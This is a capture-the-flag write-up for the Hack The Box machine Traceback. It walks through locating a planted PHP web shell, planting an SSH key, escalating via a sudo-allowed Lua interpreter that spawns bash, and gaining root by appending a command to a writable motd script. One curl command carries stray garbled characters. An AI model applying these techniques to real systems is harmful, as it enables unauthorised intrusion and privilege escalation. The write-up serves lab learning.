---
title: "HTB Traceback Write-up"
date: 2020-05-02T00:00:00-00:00
cover: /img/htb-traceback/tb-webshell2.png
description: A write-up for Traceback on hackthebox.eu
tags: ['hackthebox', 'ctf']
---

This is a quick write-up for the HTB machine [Traceback](https://www.hackthebox.eu/home/machines/profile/233).

## Enumeration

A quick port scan revealed a couple services.

```text
nmap -Pn 10.10.10.181

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

I visited the web server, which had a "hacked" message. I tried enumerating directories, webpages, and HTTP methods, but nothing was of interest other than the message

```html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
```

I was lost for a bit, but focusing on the message I decided to look for common web shells that might already exist on the server. Once I finally searched for `Xh4H` and `web shell` together, I found the intended twitter message linking to a list of web shells.

![.](/img/htb-traceback/tb-twitter.png)

I cloned the web shell repo and used a curl loop to see if any of the default filenames were found on the server.

```bash
git clone https://github.com/TheBinitGhimire/Web-Shells.git
for file in `ls Web-Shells`; do echo $file && vvvvvvvvvvvvvvcurl -I http://10.10.10.181/$file; done

punk-nopass.php
HTTP/1.1 404 Not Found

r57.php
HTTP/1.1 404 Not Found

smevk.php
HTTP/1.1 200 OK
```

I quickly found that one of the scripts is on the server. After visiting the web shell `10.10.10.181/smevk.php`, there is a login page and it uses the credentials hardcoded in the script.

![.](/img/htb-traceback/tb-login.png)

The web shell provides a lot of immediate info about our user-level permissions, including our username webadmin, and allows us to run a variety of post-exploitation enumeration scripts.

![.](/img/htb-traceback/tb-webshell1.png)

## Privilege Escalation

I prefer to work from a standard SSH session rather than a web shell, so I add my public SSH key to the current user's ~/.ssh/authorized_keys and then SSH to the host.

![.](/img/htb-traceback/tb-webshell2.png)

```bash
ssh webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat May  2 19:11:34 2020 from 10.10.14.34
webadmin@traceback:~$ 
```

The first thing I notice is the connection error in the motd when connecting. I checked for the user flag in webadmin's home directory, but didn't find it. Instead there is a `note.txt` with a pointed message about lua - which implies privesc is needed.

```text
webadmin@traceback:~$ cat ~/note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

I started doing some standard user privesc checks and `sudo -l` finally led me to the next step. If you use any sort of enumeration or post post-exploitation scripts, this should get caught.

```text
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

This means that our current user `webadmin` can run the `luvit` program as `sysadmin`. Luvit happens to be a lua REPL interpreter, which lines up with the `note.txt` from earlier. Running levit as sysadmin via sudo, we can spawn a shell with sysadmin's permissions. The user flag is in sysadmin's home directory.

```text
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
sysadmin@traceback:~$ cat ~/user.txt
# HTB{user_flag}
```

Moving onto the root flag, I started privesc enumeration. When viewing the running processes, I noticed an odd job interacting with motd then I recalled the altered motd from earlier.

```text
root       5660  0.0  0.0   4628   772 ?        Ss   17:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

In hindsight, I got a little lucky with noticing the running process because it would disappear and reappear. This turned out to be a cronjob, which I believe could have been caught with further enumeration.

Checking out both directories involved in the process, I found writeable files in `/etc/update-motd.d/`. These files are altering the motd banner when connecting via SSH.

```text
sysadmin@traceback:~$ ls -lha /etc/update-motd.d/
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 .
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 May  3 12:22 00-header
-rwxrwxr-x  1 root sysadmin  982 May  3 12:22 10-help-text
-rwxrwxr-x  1 root sysadmin 4.2K May  3 12:22 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 May  3 12:22 80-esm
-rwxrwxr-x  1 root sysadmin  299 May  3 12:22 91-release-upgrade

sysadmin@traceback:~$ cat /etc/update-motd.d/00-header 
#!/bin/sh

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
```

Because this file is writeable, we can add some code that will be executed by root when we first connect over SSH. I simply added a command to display the root flag in the SSH motd banner. Then I reconnected to see the flag.

```text
sysadmin@traceback:~$ echo "cat /root/root.txt" >> /etc/update-motd.d/00-header 
sysadmin@traceback:~$ exit
webadmin@traceback:~$ exit
logout
Connection to 10.10.10.181 closed.
root@kali:~# ssh webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

HTB{root_flag}


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May  3 12:19:35 2020 from 10.10.14.34
```